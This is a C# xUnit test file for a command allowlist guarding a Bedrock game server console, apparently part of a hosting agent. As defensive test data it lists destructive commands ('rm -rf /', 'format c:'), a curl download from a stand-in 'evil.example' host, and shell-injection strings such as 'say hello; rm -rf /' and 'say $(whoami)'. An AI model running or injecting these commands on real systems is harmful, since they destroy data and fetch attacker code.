using OGHost.Agent.Services;
using Xunit;

namespace OGHost.Agent.Tests;

/// <summary>
/// The console command allowlist is a security boundary: it is the only thing
/// standing between an authenticated web request and a live BDS process. These
/// tests assert both that legitimate Bedrock commands pass and that every
/// injection shape we can think of is refused.
/// </summary>
public sealed class CommandAllowlistTests
{
    [Theory]
    [InlineData("list")]
    [InlineData("say hello world")]
    [InlineData("difficulty hard")]
    [InlineData("gamemode creative Steve")]
    [InlineData("tp @a 100 64 200")]
    [InlineData("give @p diamond 64")]
    [InlineData("gamerule doDaylightCycle false")]
    [InlineData("save hold")]
    [InlineData("stop")]
    [InlineData("allowlist add Notch")]
    [InlineData("kick Steve AFK")]
    [InlineData("title @a title §cWelcome")]
    public void Allows_official_bedrock_commands(string command)
    {
        Assert.True(ServerProcessManager.IsAllowedCommand(command, out _),
            $"Expected '{command}' to be allowed");
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("dir")]
    [InlineData("powershell")]
    [InlineData("cmd")]
    [InlineData("rm -rf /")]
    [InlineData("del C:\\Windows")]
    [InlineData("format c:")]
    [InlineData("curl http://evil.example/x.exe")]
    [InlineData("Invoke-WebRequest")]
    [InlineData("notacommand foo")]
    public void Refuses_shell_and_unknown_commands(string command)
    {
        Assert.False(ServerProcessManager.IsAllowedCommand(command, out var reason));
        Assert.False(string.IsNullOrWhiteSpace(reason));
    }

    [Theory]
    [InlineData("say hello & calc.exe")]
    [InlineData("say hello; rm -rf /")]
    [InlineData("say hello | whoami")]
    [InlineData("say `id`")]
    [InlineData("say $(whoami)")]
    [InlineData("say a > b")]
    [InlineData("say a < b")]
    [InlineData("say line1\nstop")]
    [InlineData("say line1\r\nstop")]
    public void Refuses_shell_metacharacters_even_under_an_allowed_head(string command)
    {
        Assert.False(ServerProcessManager.IsAllowedCommand(command, out var reason));
        Assert.Contains("not permitted", reason);
    }

    [Fact]
    public void Refuses_overlong_commands()
    {
        var command = "say " + new string('a', 600);
        Assert.False(ServerProcessManager.IsAllowedCommand(command, out var reason));
        Assert.Contains("too long", reason);
    }

    [Fact]
    public void Allowlist_is_case_insensitive_on_the_command_head()
    {
        Assert.True(ServerProcessManager.IsAllowedCommand("SAY hello", out _));
        Assert.True(ServerProcessManager.IsAllowedCommand("LiSt", out _));
    }

    [Fact]
    public void Rejection_reason_explains_that_there_is_no_shell()
    {
        ServerProcessManager.IsAllowedCommand("powershell Get-Process", out var reason);
        Assert.Contains("shell", reason, StringComparison.OrdinalIgnoreCase);
    }
}
